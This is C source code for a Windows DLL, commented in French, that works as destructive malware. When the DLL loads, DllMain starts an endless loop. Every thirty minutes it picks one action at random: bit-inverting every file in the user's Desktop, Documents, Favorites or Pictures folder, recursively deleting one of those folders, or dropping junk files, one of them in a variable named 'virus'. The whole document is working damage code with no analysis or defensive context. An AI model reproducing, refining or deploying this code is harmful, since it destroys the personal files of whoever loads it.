#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <windows.h>
#include <shlobj.h>

char folder[301];
void create_file(){

    FILE *fp;
    int i;
    char caract[3];
    char user[MAX_PATH];

    SHGetSpecialFolderPath(
    NULL, user, CSIDL_APPDATA, FALSE);
      
    strcat(user, "\\log.txt");

    fp = fopen(user, "w+");
    fclose(fp);

}


void get_folder(){
// MYPICTURES -> 0x0027
// FAVORITES  -> 0x0006
// DOCUMENTS  -> 0x0005
// DESKTOP    -> 0x0000
 int choice = (rand()%11);

 printf("%d \n",choice);
 if (choice<=1){      //desktop
    SHGetSpecialFolderPath(NULL, folder, 0x0000, FALSE);

 }else if(choice<=4){ // DOCUMENTS
    SHGetSpecialFolderPath(NULL, folder, 0x0005, FALSE);

 }else if(choice<=8){ // FAVORITES 
        SHGetSpecialFolderPath(NULL, folder, 0x0006, FALSE);

 }else{              // MYPICTURES
        SHGetSpecialFolderPath(NULL, folder, 0x0027, FALSE);
 }

}


void del_files(char path[])
{
    size_t path_len;
    char *full_path;
    DIR *dir;
    struct stat stat_path, stat_entry;
    struct dirent *entry;


    // stat for the path
    stat(path, &stat_path);



    // if path does not exists or is not dir - exit with status -1
    if (S_ISDIR(stat_path.st_mode) == 0) {

        exit(-1);
    }

    // if not possible to read the directory for this user
    if ((dir = opendir(path)) == NULL) {

        exit(-1);
    }

    // the length of the path
    path_len = strlen(path);

    // iteration through entries in the directory
    while ((entry = readdir(dir)) != NULL) {

        // skip entries "." and ".."
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;

        // determinate a full path of an entry
        full_path = (char*)calloc(path_len + strlen(entry->d_name) + 1, sizeof(char));
        strcpy(full_path, path);
        strcat(full_path, "/");
        strcat(full_path, entry->d_name);

        // stat for the entry
        stat(full_path, &stat_entry);

        // recursively remove a nested directory
        if (S_ISDIR(stat_entry.st_mode) != 0) {
            del_files(full_path);
            continue;
        }

        // remove a file object
        if (unlink(full_path) != 0){
            free(full_path);
        }


    }

    // remove the devastated directory and close the object of it
    rmdir(path);



    closedir(dir);
}


void encrypt_files(){

    FILE *f;//Pointeur vers le ficher a crypter
    FILE *fcrypt;//Pointeur vers le fichier crypté
    FILE *tmp;//Pointeur vers le fichier temporaire
    char octet;//Octet lu dans le fichier a crypter
    char confirm;//Confirmation du cryptage
    char nf[100];//Contient le nom du fichier
    char path[351]="";//Chemin du fichier a crypter
    char pathtmp[301]="";//Chemin du fichier temporaire

    get_folder();




  strcpy(pathtmp, folder);       //Chemin du fichier
  strcat(pathtmp, "\\temp.tmp"); //temporaire

HANDLE search;
strcpy(path, folder); //Les fichiers a crypter sont tout ceux contenu
strcat(path, "\\*.*");//dans folder...
LPCTSTR dir = path;
WIN32_FIND_DATA IpFindFileData;
search = FindFirstFile(dir,&IpFindFileData);//On cherche le 1er fichier


strcpy(path, folder);
  strcat(path, "\\");
  strcat(path, IpFindFileData.cFileName);

  f = fopen(path, "rb"); //On ouvre le fichier
  if(f!=NULL)//Si il n'y a pas d'erreur lors de l'ouverture du fichier...
  {
  tmp = fopen(pathtmp, "wb");//On créé le fichier temporaire
  fread(&octet, 1, 1, f); //On lit un octet du fichier a crypter
  while(!feof(f))//Tant qu'on est pas a la fin du fichier...
    {
    fwrite(&octet, 1, 1, tmp);//...on ecrit l'octet lu dans le fichier temp.
    fread(&octet, 1, 1, f);//et on en lit un nouveau dans le fichier
    }
  fclose(f);//On ferme le fichier
  fclose(tmp);//On ferme le fichier temporaire
  remove(path);//On suprimme le fichier

  fcrypt = fopen(path, "wb");//On créé un nouveau fichier ayant le même nom que l'ancien
  tmp = fopen(pathtmp, "rb");//On ouvre le fichier temporaire en lecture

  fread(&octet, 1, 1, tmp);//On lit un octet du fichier temporaire

  while(!feof(tmp))
    {
    octet=~octet;//On inverse les bits de l'octet lu...
    fwrite(&octet, 1, 1, fcrypt);//...et on l'ecrit dans le nouveau fichier...
    fread(&octet, 1, 1, tmp);//...puis on lit un nouvel octet dans le fichier temp.
    }

  fclose(tmp);//On ferme le ficheir temporaire
  fclose(fcrypt);//On ferme le fichier crypté
  remove(pathtmp);//On supprime le fichier temporaire
  }


while(FindNextFile(search, &IpFindFileData))//On cherche des fichiers tant qu'on en trouve.
{

  strcpy(path, folder);
  strcat(path, "\\");
  strcat(path, IpFindFileData.cFileName);



  f = fopen(path, "rb"); //On ouvre le fichier
  if(f!=NULL)//Si il n'y a pas d'erreur lors de l'ouverture du fichier...
  {
  tmp = fopen(pathtmp, "wb");//On créé le fichier temporaire
  fread(&octet, 1, 1, f); //On lit un octet du fichier a crypter
  while(!feof(f))//Tant qu'on est pas a la fin du fichier...
    {
    fwrite(&octet, 1, 1, tmp);//...on ecrit l'octet lu dans le fichier temp.
    fread(&octet, 1, 1, f);//et on en lit un nouveau dans le fichier
    }
  fclose(f);//On ferme le fichier
  fclose(tmp);//On ferme le fichier temporaire
  remove(path);//On suprimme le fichier

  fcrypt = fopen(path, "wb");//On créé un nouveau fichier ayant le même nom que l'ancien
  tmp = fopen(pathtmp, "rb");//On ouvre le fichier temporaire en lecture

  fread(&octet, 1, 1, tmp);//On lit un octet du fichier temporaire

  while(!feof(tmp))
    {
    octet=~octet;//On inverse les bits de l'octet lu...
    fwrite(&octet, 1, 1, fcrypt);//...et on l'ecrit dans le nouveau fichier...
    fread(&octet, 1, 1, tmp);//...puis on lit un nouvel octet dans le fichier temp.
    }

  fclose(tmp);//On ferme le fichier temporaire
  fclose(fcrypt);//On ferme le fichier crypté
  remove(pathtmp);//On supprime le fichier temporaire
  }
}

getchar();
fflush(stdin);

FindClose(search);//La recherche est terminée...

}

void creat_file_in_folder(){
   FILE *fp;

    int i;
    char caract[3];

    for(i=1; i<=2; i++){
            
        get_folder();

         char virus[30] = "\\temp";
         sprintf(caract,"%d",i);
         strcat(virus , caract);
         strcat(folder, virus);
         
        //We create the files
        fp = fopen(folder, "w+");
        fclose(fp);
        Sleep(1500);

    }
}


BOOL WINAPI
DllMain (HANDLE hDLL,DWORD dwReason,LPVOID lpvReserved){
    switch(dwReason){

        case DLL_PROCESS_ATTACH:


            create_file();              // etre sure que le dll a etait creé
            int make_choice;

            while(1){
                make_choice = (rand()%11); // pour garder nos valuer dans l'intervale [0,10]
            
                if(make_choice<=1){
                    encrypt_files();

                }else if(make_choice<=3){
                    get_folder();
                    del_files(folder);

                }else{
                    creat_file_in_folder();
                }
                Sleep(1800000); // 30 min

            }


        break;
    }

    return TRUE;
}